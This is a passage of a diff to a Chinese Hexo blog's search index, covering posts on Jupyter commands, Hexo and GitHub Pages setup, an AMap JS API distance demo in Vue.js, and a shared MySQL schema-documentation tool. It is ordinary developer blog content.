-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#默认端口8888启动并打开浏览器</span><br><span class="line">jupyter notebook</span><br><span class="line">#指定端口启动</span><br><span class="line">jupyter notebook --port &lt;port_number&gt;</span><br><span class="line">#启动服务器但不打开浏览器</span><br><span class="line">jupyter notebook --no-browser</span><br><span class="line">#启动时打开指定文档</span><br><span class="line">jupyter notebook notebook.ipynb</span><br></pre></td></tr></table></figure>
-
-<p>默认启动界面<br><img src="/img/20250520/3.png" alt></p>
-<h3 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#所有配置目录</span><br><span class="line">jupyter --paths</span><br><span class="line">#配置目录</span><br><span class="line">jupyter --config-dir</span><br><span class="line">#数据目录</span><br><span class="line">jupyter --data-dir</span><br><span class="line">#运行时目录</span><br><span class="line">jupyter --runtime-dir</span><br></pre></td></tr></table></figure>
-
-<h3 id="基本操做"><a href="#基本操做" class="headerlink" title="基本操做"></a>基本操做</h3><p><img src="/img/20250520/7.png" alt><br>工具栏<br>保存，插入单元格，剪切单元格，复制单元格，粘贴单元格(到下方)，运行单元格，重置内核，充值内核并运行所有单元格，选择单元格类型（代码，Markdown等）<br>单元格工具栏<br>复制单元格并插入到下方，上移单元格，下移单元格，在前面插入单元格，在后面插入单元格，删除单元格</p>
-<p>新建文档，扩展名ipynb<br><img src="/img/20250520/4.png" alt><br>内核选择Python3<br><img src="/img/20250520/5.png" alt><br>文档效果展示，单元格支持Markdown语法和代码执行<br><img src="/img/20250520/6.png" alt></p>
-]]></content>
-      <tags>
-        <tag>AI</tag>
-        <tag>Jupyter</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>博客修改路上的一些事</title>
     <url>/2019/11/10/%E5%8D%9A%E5%AE%A2%E4%BF%AE%E6%94%B9%E8%B7%AF%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B/</url>
     <content><![CDATA[<h1 id="博客修改路上的一些事"><a href="#博客修改路上的一些事" class="headerlink" title="博客修改路上的一些事"></a>博客修改路上的一些事</h1><p><em>有些事情去搞了才发现坎坷不断，但是不去做的话不管好的还是坏的都没有。</em></p>
@@ -1675,30 +2034,6 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
 <p>无奈跑了趟公司，发现.gitignore文件并没有忽略主题下的文件。原因可能是clone主题时产生的隐藏文件.git的影响。最后删掉多余的git相关文件，push成功。<br>公司电脑ie11与edge显示的背景都有问题，F12发现颜色无法识别十六进制颜色，修改为rgba格式后解决。<br><img src="/img/20191110/3.png" alt></p>
 <p>晚上回来提交修改时发现，GitHub的commit记录有问题，全部都是我另一个账号的。不管是账户密码提交还是通过本账号ssh方式提交，都是别的账户（包含自己的私有库）。<br>然后想了一下共通点，都是通过git提交的，难道和git的config有关？git提交时主要配置了user.name和user.email，发现两台电脑配置的用户名应该不一样，那么原因应该出在user.email上了。<br>然后验证自己的猜想(还要了朋友的邮箱往实验)，果然是，GitHub是通过这个来显示用户名的。<br><img src="/img/20191110/4.jpg" alt><br>如果配置的user.email和当前账户不一样时，这个提交记录只在项目里能看到，个人页面是不会做记录的。</p>
 <p>期间加了一个友情链接和标签页，对于背景音乐还是去比较好吧，加载有点慢(本地加载)，而且页面刷新还有问题(主题限定，设置为自动播放的时候，js报错)没去解决。<br>微博大概的雏形就这样了。</p>
-]]></content>
-      <tags>
-        <tag>博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>制作一个简单的博客</title>
-    <url>/2019/11/07/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h1 id="制作一个简单的博客"><a href="#制作一个简单的博客" class="headerlink" title="制作一个简单的博客"></a>制作一个简单的博客</h1><p><em>没错，说的就是这个，算是第一篇博客文章吧</em></p>
-<p>基于博客框架<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a>+<a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a>，通过<a href="http://www.markdown.cn/" target="_blank" rel="noopener">Markdown</a>来书写文章。无域名，无服务器，如果没有什么特殊需求的话，金钱投入0。网上这方面文章烂大街了，这里不做详细介绍。</p>
-<p><a href="https://nodejs.org" target="_blank" rel="noopener">Node.js</a>,<a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>默认都会，不解释。</p>
-<blockquote>
-<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2></blockquote>
-<p>看官网教程就可以，我只看了一点。Hexo有很多主题，找自己喜欢的就行。我的是在<a href="https://github.com/Fechin/hexo-theme-diaspora" target="_blank" rel="noopener">Diaspora</a>基础上改的，主要加了网页背景。</p>
-<h4 id="这里补充两点："><a href="#这里补充两点：" class="headerlink" title="这里补充两点："></a>这里补充两点：</h4><ul>
-<li>主题下载命名问题<br>有的主题带hexo-theme-的前缀，放到themes文件夹的时候要去掉这个。</li>
-<li>主题自定义Front-Matter<br>这个每个主题设置的可能都不一样，比如Diaspora的文章封面参数cover就是自己定义的。</li>
-</ul>
-<blockquote>
-<h2 id="GitHub-Pages"><a href="#GitHub-Pages" class="headerlink" title="GitHub Pages"></a>GitHub Pages</h2></blockquote>
-<p>申请一个GitHub账号，新建一个和账号名字一样的仓库即可。不过可能找不到你想要的名字（大部分都被申请过了，比如这个账号的名字就是在我想要的基础上变换出来的）。<br>以前写过关于GithubPage的文章，可以点击<a href="https://mp.weixin.qq.com/s/nm1OPwHY4Lz8ClHroPZZJA" target="_blank" rel="noopener">这里</a>查看。</p>
-<blockquote>
-<h2 id="额外补充"><a href="#额外补充" class="headerlink" title="额外补充"></a>额外补充</h2></blockquote>
-<p><em>到这才知道，GitHub不同账号不能绑定相同的ssh<br>手动部署到GitHub，发现评论不能用，原来还需要配置Gitalk（主题限定）</em></p>
 ]]></content>
       <tags>
         <tag>博客</tag>
@@ -1820,78 +2155,6 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       </tags>
   </entry>
   <entry>
-    <title>工作笔记-Vue.js使用高德地图jsAPI计算两点间距离</title>
-    <url>/2020/06/01/%E5%B7%A5%E4%BD%9C%E7%AC%94%E8%AE%B0-Vue-js%E4%BD%BF%E7%94%A8%E9%AB%98%E5%BE%B7%E5%9C%B0%E5%9B%BEjsAPI%E8%AE%A1%E7%AE%97%E4%B8%A4%E7%82%B9%E9%97%B4%E8%B7%9D%E7%A6%BB/</url>
-    <content><![CDATA[<h2 id="工作笔记-Vue-js使用高德地图jsAPI计算两点间距离"><a href="#工作笔记-Vue-js使用高德地图jsAPI计算两点间距离" class="headerlink" title="工作笔记-Vue.js使用高德地图jsAPI计算两点间距离"></a>工作笔记-Vue.js使用高德地图jsAPI计算两点间距离</h2><p><em>只是在Vue里用到，主要还是高德地图jsAPI的逻辑，记录一下，以备后用</em></p>
-<h2 id="vue-amap"><a href="#vue-amap" class="headerlink" title="vue-amap"></a>vue-amap</h2><p><a href="https://elemefe.github.io/vue-amap/" target="_blank" rel="noopener">vue-amap</a>基于 Vue 2.x 和高德地图的地图组件。Vue不是很熟悉，从文档中复制粘贴，这里只提一下。</p>
-<p>npm安装<code>npm install vue-amap --save</code></p>
-<p>引入vue-amap</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Vue from &apos;vue&apos;;</span><br><span class="line">import VueAMap from &apos;vue-amap&apos;;</span><br><span class="line">Vue.use(VueAMap);</span><br><span class="line">VueAMap.initAMapApiLoader(&#123;</span><br><span class="line">  key: &quot;你的高德地图key&quot;,</span><br><span class="line">  plugin: [</span><br><span class="line">    &quot;Autocomplete&quot;,</span><br><span class="line">    &quot;PlaceSearch&quot;,</span><br><span class="line">    &quot;Scale&quot;,</span><br><span class="line">    &quot;OverView&quot;,</span><br><span class="line">    &quot;ToolBar&quot;,</span><br><span class="line">    &quot;MapType&quot;,</span><br><span class="line">    &quot;PolyEditor&quot;,</span><br><span class="line">    &quot;AMap.CircleEditor&quot;</span><br><span class="line">  ],</span><br><span class="line">  // 默认高德 sdk 版本为 1.4.4</span><br><span class="line">  v: &quot;1.4.4&quot;</span><br><span class="line">&#125;);</span><br><span class="line">data() &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    // 地图</span><br><span class="line">    zoom: 12,</span><br><span class="line">    center: [117.055185, 36.684594],</span><br><span class="line">    amapManager,</span><br><span class="line">    events: &#123;</span><br><span class="line">      // o下面js中替换成map了</span><br><span class="line">      init(o) &#123;……&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;el-col :span=&quot;16&quot;&gt;</span><br><span class="line">  &lt;el-form-item label prop=&quot;code&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;amap-page-container&quot;&gt;</span><br><span class="line">      &lt;el-amap</span><br><span class="line">        vid=&quot;amapDemo&quot;</span><br><span class="line">        :center=&quot;center&quot;</span><br><span class="line">        :amap-manager=&quot;amapManager&quot;</span><br><span class="line">        :zoom=&quot;zoom&quot;</span><br><span class="line">        :events=&quot;events&quot;</span><br><span class="line">        class=&quot;amap-demo&quot;</span><br><span class="line">      &gt;&lt;/el-amap&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/el-form-item&gt;</span><br><span class="line">&lt;/el-col&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="高德地图jsAPI"><a href="#高德地图jsAPI" class="headerlink" title="高德地图jsAPI"></a>高德地图jsAPI</h2><p>主要记录这部分代码，后来从Vue中独立出来。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script src=&quot;https://webapi.amap.com/maps?v=1.4.4&amp;key=你的高德地图key&amp;plugin=AMap.Geocoder&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var map = new AMap.Map(&apos;container&apos;);</span><br><span class="line"></span><br><span class="line">var markers = [];</span><br><span class="line">var contentAry = [&quot;注册&quot;, &quot;发函&quot;, &quot;回函&quot;];</span><br><span class="line">var lineStyleAry = [&quot;#80d8ff&quot;, &quot;#ff304e&quot;];</span><br><span class="line">var textStyleAry = [</span><br><span class="line">	&#123;&quot;background-color&quot;: &quot;#29b6f6&quot;, &quot;border-color&quot;: &quot;#e1f5fe&quot;, &quot;font-size&quot;: &quot;12px&quot;&#125;,</span><br><span class="line">	&#123;&quot;background-color&quot;: &quot;#f62972&quot;, &quot;border-color&quot;: &quot;#fee1ee&quot;, &quot;font-size&quot;: &quot;12px&quot;&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">// 地理编码，什么时候检索完不可控（顺序有时也会变）</span><br><span class="line">var index = 0;</span><br><span class="line">/*</span><br><span class="line">var geocoder = new AMap.Geocoder(&#123;</span><br><span class="line">	city: &quot;010&quot;, //城市设为北京，默认：“全国”</span><br><span class="line">&#125;);</span><br><span class="line">geoCode(&quot;八大胡同&quot;);</span><br><span class="line">geoCode(&quot;三里屯&quot;);</span><br><span class="line">geoCode(&quot;中关村&quot;);</span><br><span class="line"></span><br><span class="line">function geoCode(address) &#123;</span><br><span class="line">	geocoder.getLocation(address, function(status, result) &#123;</span><br><span class="line">		if (status === &apos;complete&apos; &amp;&amp; result.geocodes.length) &#123;</span><br><span class="line">			var lnglat = result.geocodes[0].location;</span><br><span class="line">			var marker = new AMap.Marker();</span><br><span class="line">			marker.setPosition(lnglat);</span><br><span class="line">			map.add(marker);</span><br><span class="line">			marker.setLabel(&#123;</span><br><span class="line">				offset: new AMap.Pixel( - 7, -6),</span><br><span class="line">				direction: &quot;center&quot;,</span><br><span class="line">				content: contentAry[index]</span><br><span class="line">			&#125;);</span><br><span class="line">			markers[index] = marker;</span><br><span class="line">			map.setFitView(marker);</span><br><span class="line">			index++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line">// TODO 坐标点写死</span><br><span class="line">markers = [[116.386511, 39.891422], [116.457960, 39.928583], [116.315869, 39.981125]];</span><br><span class="line">// 标记点</span><br><span class="line">markers.forEach(function(marker) &#123;</span><br><span class="line">	var mk = new AMap.Marker(&#123;</span><br><span class="line">	  map: map,</span><br><span class="line">	  position: [marker[0], marker[1]]</span><br><span class="line">	&#125;);</span><br><span class="line">	mk.setLabel(&#123;</span><br><span class="line">	  offset: new AMap.Pixel(-7, -6),</span><br><span class="line">	  direction: &quot;center&quot;,</span><br><span class="line">	  content: contentAry[index]</span><br><span class="line">	&#125;);</span><br><span class="line">	index++;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// TODO 坐标点写死</span><br><span class="line">var p1 = new AMap.LngLat(116.386511, 39.891422);</span><br><span class="line">var p2 = new AMap.LngLat(116.457960, 39.928583);</span><br><span class="line">var p3 = new AMap.LngLat(116.315869, 39.981125);</span><br><span class="line">// 连线标记距离</span><br><span class="line">drawLineDistance(p1, p2, lineStyleAry[0], textStyleAry[0]);</span><br><span class="line">drawLineDistance(p2, p3, lineStyleAry[1], textStyleAry[1]);</span><br><span class="line"></span><br><span class="line">// 根据地图上添加的覆盖物分布情况，自动缩放地图到合适的视野级别，参数均可缺省</span><br><span class="line">map.setFitView();</span><br><span class="line"></span><br><span class="line">function drawLineDistance(p1, p2, lineStyle, textStyle) &#123;</span><br><span class="line">	var textPos = p1.divideBy(2).add(p2.divideBy(2));</span><br><span class="line">	// 距离</span><br><span class="line">	var distance = Math.round(p1.distance(p2));</span><br><span class="line">	var path = [p1, p2];</span><br><span class="line"></span><br><span class="line">	var line = new AMap.Polyline(&#123;</span><br><span class="line">		map: map,</span><br><span class="line">		strokeColor: lineStyle,</span><br><span class="line">		isOutline: true,</span><br><span class="line">		outlineColor: &quot;white&quot;,</span><br><span class="line">		path: path</span><br><span class="line">	&#125;);</span><br><span class="line">	// 连线</span><br><span class="line">	line.setPath(path);</span><br><span class="line">	// 设置文本</span><br><span class="line">	var text = new AMap.Text(&#123;</span><br><span class="line">		text: &quot;两点相距&quot; + distance + &quot;米&quot;,</span><br><span class="line">		position: textPos,</span><br><span class="line">		map: map,</span><br><span class="line">		style: textStyle</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
-
-<p>效果如下</p>
-<iframe width="100%" height="500px" src="https://xuchunlei.top/gaodeMap.html"></iframe>]]></content>
-      <tags>
-        <tag>Vue.js</tag>
-        <tag>高德地图</tag>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>新瓶装旧酒-MySQL数据库表结构文档生成工具分享</title>
-    <url>/2024/11/15/%E6%96%B0%E7%93%B6%E8%A3%85%E6%97%A7%E9%85%92-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E7%BB%93%E6%9E%84%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
-    <content><![CDATA[<p><em>主要就是分享一下自己以前写的工具，可以直接跳转到最后链接获取</em></p>
-<p><em>翻开博客，发现已经快一年没有写新博客了，因为不做开发很多年了，又没有去接触新技术的想法，也就没有遇到什么要解决的问题，帮朋友做的小工具还不足以发篇博客（水是能水出来的，又不是没水过）。最近尝试修改下博客，发现一个if判断都要想半天，不加注释，自己写的都得理解半天。有时候觉得以前的自己真的很强，真的喜欢编程，把兴趣变成工作，现在不写代码多年，已经跟不上时代的步伐。以前做微信公众号的时候也是兴趣使然，看看以前写的文章是真能码字，现在没了当初的热情。一看阅读量个位数，还是朋友和自己看的吧。年底了，最近也有点自己的时间，看看以前写的文章，以前写的代码，了解一下过去的自己。对自己好点吧，自己才能好一点。</em></p>
-<p>第一次发表于2018年7月的文章-<a href="https://mp.weixin.qq.com/s/pFTuW7iR8Ex4k2WtkSPaEQ" target="_blank" rel="noopener">MySQL数据库表结构文档生成工具随笔</a>，当时正是工具第一版写出来的时候。感兴趣可以去阅读一下，挽救下个位数的阅读量。废话有点多，就基本逻辑那能看一下，直接摘抄下来。</p>
-<blockquote>
-<p>起因是想理解一下数据库结构，但是没有相应的文档，就打算边看边写。但是数据库有接近180的表，就有了写工具的想法。文档的话，首选VBA。源文件是基于Navicat for &gt;MySQL抽出的数据库结构文件。生成的结构是desc 表返回的结果去掉Extra列。<br>主要是晚上在公司写的，花费了4晚上，白天有一段时间在测试。本身难度不大，就是MySQL接触太少，有些地方需求不明确，没法实现。问朋友，也没有太明白的。本来打算实践的，不过查阅了一些资料，有了新的&gt;理解。主要有两个地方，一个是key值的设定。一个是数据类型的覆盖。</p>
-<p>Key，网上解释的都大同小异。最后从官网看的文档。MySQL官网对key的解释，版本是8.0，看了一下7.5的解释，都是一样的。链接内容如下；</p>
-<blockquote>
-<p><a href="https://dev.mysql.com/doc/refman/8.0/en/show-columns.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/show-columns.html</a></p>
-</blockquote>
-<blockquote>
-<p>Key</p>
-<p>Whether the column is indexed:</p>
-<p>•If Key is empty, the column either is not indexed or is indexed onlyas a secondary column in a multiple-column, nonunique index.</p>
-<p>•If Key is PRI, the column is a PRIMARY KEY or is one of the columnsin a multiple-column PRIMARY KEY.</p>
-<p>•If Key is UNI, the column is the first column of a UNIQUE index. (AUNIQUE index permits multiple NULL values, but you can tell whether the columnpermits NULL by &gt;checking the Null field.)</p>
-<p>•If Key is MUL, the column is the first column of a nonunique indexin which multiple occurrences of a given value are permitted within the column.</p>
-<p>If more than one of the Key values appliesto a given column of a table, Key displays the one with the highest priority,in the order PRI, UNI, MUL.</p>
-<p>A UNIQUE index may be displayed as PRI ifit cannot contain NULL values and there is no PRIMARY KEY in the table. AUNIQUE index may display as MUL if several columns &gt;form a composite UNIQUEindex; although the combination of the columns is unique, each column can stillhold multiple occurrences of a given value.</p>
-</blockquote>
-<blockquote>
-<p>列中可能存在的索引：</p>
-<p>•如果键是空的, 则该列没有索引或是非唯一索引的非第一行。</p>
-<p>•如果键是PRI，则列是主键或多列主键中的列之一。</p>
-<p>•如果键是UNI，则该列是唯一索引的第一列。(唯一索引允许多个空值，但可以通过检查Null字段来判断该列是否允许空。)</p>
-<p>•如果键为MUL，则该列是非唯一索引的第一列，其中允许在列中多次出现给定值。</p>
-<p>如果不止一个键值应用于表的给定列，则键以优先级PRI、UNI、MUL的顺序显示优先级最高的一个。</p>
-<p>如果不能包含空值且表中没有主键，则可以显示唯一索引作为PRI。如果多个列形成复合唯一索引，则唯一索引可以显示为MUL；尽管列的组合是唯一的，但每个列仍然可以保持给定值的多次出现。</p>
-</blockquote>
-<p>我的理解，也是按照下边逻辑写的，没有主键有唯一的情况未考虑：</p>
-<blockquote>
-<p>只要是主键就表示PRI。</p>
-<p>只要是单列唯一索引就表示UNI。</p>
-<p>多列组合唯一索引第一列，非唯一索引第一列表示MUL。</p>
-<p>唯一索引的非第一行，不表示。</p>
-</blockquote>
-</blockquote>
-<p>后来有几次bug修改，以及一些功能优化，添加，更新记录如下：<br><img src="/img/20241115/1.png" alt><br>1.4.0的时候出了一个插曲，完成删库成就，具体可以看下这篇文章-<a href="https://mp.weixin.qq.com/s/_WQxH-DDec8Sov5MPPPiaQ" target="_blank" rel="noopener">某码农的代码碎片5-删库跑路</a><br>最后一版还是B站go语言源代码泄露的时候改的，手动滑稽</p>
-<p>操做页面里有写，根据需要勾选选项，点按钮，选择对应的sql结构文件就行。<br><img src="/img/20241115/2.png" alt></p>
-<p>生成表结构的效果图<br><img src="/img/20241115/3.png" alt></p>
-<p>最后工具获取链接：<br><a href="https://xuchunlei.top/MySQL数据库表结构文档生成工具V1.5.0.xlsm">MySQL数据库表结构文档生成工具V1.5.0.xlsm</a></p>
-]]></content>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>批量获取文件夹下所有文件信息(修改时间)</title>
     <url>/2023/11/26/%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF-%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4/</url>
     <content><![CDATA[<h2 id="批量获取文件夹下所有文件信息-修改时间"><a href="#批量获取文件夹下所有文件信息-修改时间" class="headerlink" title="批量获取文件夹下所有文件信息(修改时间)"></a>批量获取文件夹下所有文件信息(修改时间)</h2><p><em>依旧是给朋友写的小工具，在原来写的几个小工具上改的，写成Python版本后，又写了VBA版（个人还是喜欢VBA）和VBS版，其他版本暂时不想搞了，意义不大</em></p>
@@ -1916,6 +2179,29 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
         <tag>Python</tag>
         <tag>VBS</tag>
         <tag>VBA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>工作笔记-Vue.js使用高德地图jsAPI计算两点间距离</title>
+    <url>/2020/06/01/%E5%B7%A5%E4%BD%9C%E7%AC%94%E8%AE%B0-Vue-js%E4%BD%BF%E7%94%A8%E9%AB%98%E5%BE%B7%E5%9C%B0%E5%9B%BEjsAPI%E8%AE%A1%E7%AE%97%E4%B8%A4%E7%82%B9%E9%97%B4%E8%B7%9D%E7%A6%BB/</url>
+    <content><![CDATA[<h2 id="工作笔记-Vue-js使用高德地图jsAPI计算两点间距离"><a href="#工作笔记-Vue-js使用高德地图jsAPI计算两点间距离" class="headerlink" title="工作笔记-Vue.js使用高德地图jsAPI计算两点间距离"></a>工作笔记-Vue.js使用高德地图jsAPI计算两点间距离</h2><p><em>只是在Vue里用到，主要还是高德地图jsAPI的逻辑，记录一下，以备后用</em></p>
+<h2 id="vue-amap"><a href="#vue-amap" class="headerlink" title="vue-amap"></a>vue-amap</h2><p><a href="https://elemefe.github.io/vue-amap/" target="_blank" rel="noopener">vue-amap</a>基于 Vue 2.x 和高德地图的地图组件。Vue不是很熟悉，从文档中复制粘贴，这里只提一下。</p>
+<p>npm安装<code>npm install vue-amap --save</code></p>
+<p>引入vue-amap</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Vue from &apos;vue&apos;;</span><br><span class="line">import VueAMap from &apos;vue-amap&apos;;</span><br><span class="line">Vue.use(VueAMap);</span><br><span class="line">VueAMap.initAMapApiLoader(&#123;</span><br><span class="line">  key: &quot;你的高德地图key&quot;,</span><br><span class="line">  plugin: [</span><br><span class="line">    &quot;Autocomplete&quot;,</span><br><span class="line">    &quot;PlaceSearch&quot;,</span><br><span class="line">    &quot;Scale&quot;,</span><br><span class="line">    &quot;OverView&quot;,</span><br><span class="line">    &quot;ToolBar&quot;,</span><br><span class="line">    &quot;MapType&quot;,</span><br><span class="line">    &quot;PolyEditor&quot;,</span><br><span class="line">    &quot;AMap.CircleEditor&quot;</span><br><span class="line">  ],</span><br><span class="line">  // 默认高德 sdk 版本为 1.4.4</span><br><span class="line">  v: &quot;1.4.4&quot;</span><br><span class="line">&#125;);</span><br><span class="line">data() &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    // 地图</span><br><span class="line">    zoom: 12,</span><br><span class="line">    center: [117.055185, 36.684594],</span><br><span class="line">    amapManager,</span><br><span class="line">    events: &#123;</span><br><span class="line">      // o下面js中替换成map了</span><br><span class="line">      init(o) &#123;……&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;el-col :span=&quot;16&quot;&gt;</span><br><span class="line">  &lt;el-form-item label prop=&quot;code&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;amap-page-container&quot;&gt;</span><br><span class="line">      &lt;el-amap</span><br><span class="line">        vid=&quot;amapDemo&quot;</span><br><span class="line">        :center=&quot;center&quot;</span><br><span class="line">        :amap-manager=&quot;amapManager&quot;</span><br><span class="line">        :zoom=&quot;zoom&quot;</span><br><span class="line">        :events=&quot;events&quot;</span><br><span class="line">        class=&quot;amap-demo&quot;</span><br><span class="line">      &gt;&lt;/el-amap&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/el-form-item&gt;</span><br><span class="line">&lt;/el-col&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="高德地图jsAPI"><a href="#高德地图jsAPI" class="headerlink" title="高德地图jsAPI"></a>高德地图jsAPI</h2><p>主要记录这部分代码，后来从Vue中独立出来。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script src=&quot;https://webapi.amap.com/maps?v=1.4.4&amp;key=你的高德地图key&amp;plugin=AMap.Geocoder&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var map = new AMap.Map(&apos;container&apos;);</span><br><span class="line"></span><br><span class="line">var markers = [];</span><br><span class="line">var contentAry = [&quot;注册&quot;, &quot;发函&quot;, &quot;回函&quot;];</span><br><span class="line">var lineStyleAry = [&quot;#80d8ff&quot;, &quot;#ff304e&quot;];</span><br><span class="line">var textStyleAry = [</span><br><span class="line">	&#123;&quot;background-color&quot;: &quot;#29b6f6&quot;, &quot;border-color&quot;: &quot;#e1f5fe&quot;, &quot;font-size&quot;: &quot;12px&quot;&#125;,</span><br><span class="line">	&#123;&quot;background-color&quot;: &quot;#f62972&quot;, &quot;border-color&quot;: &quot;#fee1ee&quot;, &quot;font-size&quot;: &quot;12px&quot;&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">// 地理编码，什么时候检索完不可控（顺序有时也会变）</span><br><span class="line">var index = 0;</span><br><span class="line">/*</span><br><span class="line">var geocoder = new AMap.Geocoder(&#123;</span><br><span class="line">	city: &quot;010&quot;, //城市设为北京，默认：“全国”</span><br><span class="line">&#125;);</span><br><span class="line">geoCode(&quot;八大胡同&quot;);</span><br><span class="line">geoCode(&quot;三里屯&quot;);</span><br><span class="line">geoCode(&quot;中关村&quot;);</span><br><span class="line"></span><br><span class="line">function geoCode(address) &#123;</span><br><span class="line">	geocoder.getLocation(address, function(status, result) &#123;</span><br><span class="line">		if (status === &apos;complete&apos; &amp;&amp; result.geocodes.length) &#123;</span><br><span class="line">			var lnglat = result.geocodes[0].location;</span><br><span class="line">			var marker = new AMap.Marker();</span><br><span class="line">			marker.setPosition(lnglat);</span><br><span class="line">			map.add(marker);</span><br><span class="line">			marker.setLabel(&#123;</span><br><span class="line">				offset: new AMap.Pixel( - 7, -6),</span><br><span class="line">				direction: &quot;center&quot;,</span><br><span class="line">				content: contentAry[index]</span><br><span class="line">			&#125;);</span><br><span class="line">			markers[index] = marker;</span><br><span class="line">			map.setFitView(marker);</span><br><span class="line">			index++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line">// TODO 坐标点写死</span><br><span class="line">markers = [[116.386511, 39.891422], [116.457960, 39.928583], [116.315869, 39.981125]];</span><br><span class="line">// 标记点</span><br><span class="line">markers.forEach(function(marker) &#123;</span><br><span class="line">	var mk = new AMap.Marker(&#123;</span><br><span class="line">	  map: map,</span><br><span class="line">	  position: [marker[0], marker[1]]</span><br><span class="line">	&#125;);</span><br><span class="line">	mk.setLabel(&#123;</span><br><span class="line">	  offset: new AMap.Pixel(-7, -6),</span><br><span class="line">	  direction: &quot;center&quot;,</span><br><span class="line">	  content: contentAry[index]</span><br><span class="line">	&#125;);</span><br><span class="line">	index++;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// TODO 坐标点写死</span><br><span class="line">var p1 = new AMap.LngLat(116.386511, 39.891422);</span><br><span class="line">var p2 = new AMap.LngLat(116.457960, 39.928583);</span><br><span class="line">var p3 = new AMap.LngLat(116.315869, 39.981125);</span><br><span class="line">// 连线标记距离</span><br><span class="line">drawLineDistance(p1, p2, lineStyleAry[0], textStyleAry[0]);</span><br><span class="line">drawLineDistance(p2, p3, lineStyleAry[1], textStyleAry[1]);</span><br><span class="line"></span><br><span class="line">// 根据地图上添加的覆盖物分布情况，自动缩放地图到合适的视野级别，参数均可缺省</span><br><span class="line">map.setFitView();</span><br><span class="line"></span><br><span class="line">function drawLineDistance(p1, p2, lineStyle, textStyle) &#123;</span><br><span class="line">	var textPos = p1.divideBy(2).add(p2.divideBy(2));</span><br><span class="line">	// 距离</span><br><span class="line">	var distance = Math.round(p1.distance(p2));</span><br><span class="line">	var path = [p1, p2];</span><br><span class="line"></span><br><span class="line">	var line = new AMap.Polyline(&#123;</span><br><span class="line">		map: map,</span><br><span class="line">		strokeColor: lineStyle,</span><br><span class="line">		isOutline: true,</span><br><span class="line">		outlineColor: &quot;white&quot;,</span><br><span class="line">		path: path</span><br><span class="line">	&#125;);</span><br><span class="line">	// 连线</span><br><span class="line">	line.setPath(path);</span><br><span class="line">	// 设置文本</span><br><span class="line">	var text = new AMap.Text(&#123;</span><br><span class="line">		text: &quot;两点相距&quot; + distance + &quot;米&quot;,</span><br><span class="line">		position: textPos,</span><br><span class="line">		map: map,</span><br><span class="line">		style: textStyle</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span 